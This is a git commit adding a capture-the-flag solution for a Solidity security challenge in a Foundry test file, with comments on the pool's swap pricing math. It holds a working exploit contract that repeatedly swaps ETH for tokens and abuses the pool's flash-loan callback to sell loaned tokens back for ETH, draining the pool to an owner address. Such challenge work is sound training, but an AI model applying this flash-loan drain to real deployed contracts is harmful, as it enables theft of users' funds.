4fe7d3d5cac5f64a89383f3ddb7aef754a4ed878
Luka Racki <luka@racki.dev>
2023-07-16 22:20:25 +0200

    feat: solve 6

--- test/Challenge6.t.sol
+++ test/Challenge6.t.sol
@@ -3,14 +3,84 @@ pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
 import {YieldPool, SecureumToken, IERC20} from "../src/6_yieldPool/YieldPool.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
 
 /*////////////////////////////////////////////////////////////
 //          DEFINE ANY NECESSARY CONTRACTS HERE             //
 //    If you need a contract for your hack, define it below //
 ////////////////////////////////////////////////////////////*/
 
+//
+//  return numerator / denominator;
+//  numerator = inputAmountWithFee * _outputReserve;
+//  denominator = (_inputReserve * 100) + inputAmountWithFee;
+//  inputAmountWithFee = _inputAmount * 99;
+//  _outputReserve = tokenReserve
+//  nuumerator = _inputAmount * 99 * tokenReserve
+//  denominator = (_inputReserve * 100) + _inputAmount * 99;
+// _inputAmount * 99 * tokenReserve / (_inputReserve * 100) + _inputAmount * 99;
+// x * r < ir * 100 + x
+// r < (ir * 100) / (x*99) + 1
+// r < ir/x * 100/99 + 1
 
+// function getAmountOfTokens(uint256 _inputAmount, uint256 _inputReserve, uint256 _outputReserve)
+//     public
+//     pure
+//     returns (uint256)
+// {
+//     require(_inputReserve > 0 && _outputReserve > 0, "invalid reserves");
+//     uint256 inputAmountWithFee = _inputAmount * 99;
+//     uint256 numerator = inputAmountWithFee * _outputReserve;
+//     uint256 denominator = (_inputReserve * 100) + inputAmountWithFee;
+//     return numerator / denominator;
+// }
 
+// /**
+//  * @dev Swap ETH to TOKEN
+//  * @notice Provided ETH will be sold for TOKEN
+//  */
+// function ethToToken() public payable {
+//     uint256 tokenReserve = getReserve();
+//     uint256 tokensBought = getAmountOfTokens(msg.value, address(this).balance - msg.value, tokenReserve);
+
+//     TOKEN.transfer(msg.sender, tokensBought);
+// }
+
+contract Attack is IERC3156FlashBorrower {
+    YieldPool public yieldPool;
+    SecureumToken public token;
+    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
+    address public owner;
+
+    bytes32 private constant _CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
+
+    constructor(YieldPool _yieldPool, SecureumToken _token, address _owner) {
+        yieldPool = _yieldPool;
+        token = _token;
+        owner = _owner;
+    }
+
+    function attack() external {
+        do {
+            yieldPool.ethToToken{value: 0.1 ether}();
+            yieldPool.flashLoan(
+                IERC3156FlashBorrower(address(this)), address(token), yieldPool.getReserve() / 10000, bytes("")
+            );
+        } while (address(this).balance < 100 ether);
+        payable(owner).transfer(address(this).balance);
+    }
+
+    function onFlashLoan(address, address loanedToken, uint256 amount, uint256 fee, bytes calldata)
+        external
+        returns (bytes32)
+    {
+        token.approve(address(yieldPool), type(uint256).max);
+        yieldPool.tokenToEth(token.balanceOf(address(this)));
+        return _CALLBACK_SUCCESS;
+    }
+
+    receive() external payable {}
+}
 
 /*////////////////////////////////////////////////////////////
 //                     TEST CONTRACT                        //
@@ -47,8 +117,11 @@ contract Challenge6Test is Test {
         // forge test --match-contract Challenge6Test -vvvv //
         ////////////////////////////////////////////////////*/
 
+        Attack attack = new Attack(yieldPool, token, attacker);
 
+        payable(address(attack)).transfer(0.1 ether);
 
+        attack.attack();
 
         //==================================================//
         vm.stopPrank();
